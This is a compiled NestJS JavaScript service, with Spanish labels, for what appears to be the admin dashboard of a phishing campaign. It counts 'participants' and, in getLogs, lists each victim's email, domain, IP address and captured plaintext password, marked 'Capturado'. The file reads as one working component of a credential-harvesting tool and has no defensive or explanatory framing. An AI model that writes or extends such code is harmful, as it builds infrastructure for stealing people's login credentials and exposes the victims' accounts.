"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.DashboardService = void 0;
const common_1 = require("@nestjs/common");
const typeorm_1 = require("@nestjs/typeorm");
const typeorm_2 = require("typeorm");
const access_log_entity_1 = require("../access/access-log.entity");
let DashboardService = class DashboardService {
    accessLogRepository;
    constructor(accessLogRepository) {
        this.accessLogRepository = accessLogRepository;
    }
    async getStats() {
        const totalParticipants = await this.accessLogRepository.count();
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayStr = today.toISOString().split('T')[0];
        const todayParticipants = await this.accessLogRepository
            .createQueryBuilder('log')
            .where("date(log.created_at) = :today", { today: todayStr })
            .getCount();
        const totalEmails = await this.accessLogRepository
            .createQueryBuilder('log')
            .select('COUNT(DISTINCT log.email)', 'count')
            .getRawOne();
        const lastAccess = await this.accessLogRepository.find({
            order: { createdAt: 'DESC' },
            take: 1,
        });
        return {
            totalParticipants,
            totalEmails: parseInt(totalEmails?.count || '0', 10),
            todayParticipants,
            lastAccess: lastAccess.length > 0 ? lastAccess[0].createdAt : null,
        };
    }
    async getLogs() {
        const logs = await this.accessLogRepository.find({
            order: { createdAt: 'DESC' },
        });
        return logs.map((log) => {
            const emailParts = log.email.split('@');
            const domain = emailParts.length > 1 ? emailParts[1] : 'desconocido';
            const createdAt = new Date(log.createdAt);
            return {
                id: log.id,
                date: createdAt.toLocaleDateString('es-AR'),
                time: createdAt.toLocaleTimeString('es-AR', {
                    hour: '2-digit',
                    minute: '2-digit',
                }),
                email: log.email,
                domain,
                password: log.passwordCaptured || 'Sin contraseña',
                ipAddress: log.ipAddress,
                status: 'Capturado',
                createdAt: log.createdAt,
            };
        });
    }
};
exports.DashboardService = DashboardService;
exports.DashboardService = DashboardService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, typeorm_1.InjectRepository)(access_log_entity_1.AccessLog)),
    __metadata("design:paramtypes", [typeorm_2.Repository])
], DashboardService);
//# sourceMappingURL=dashboard.service.js.map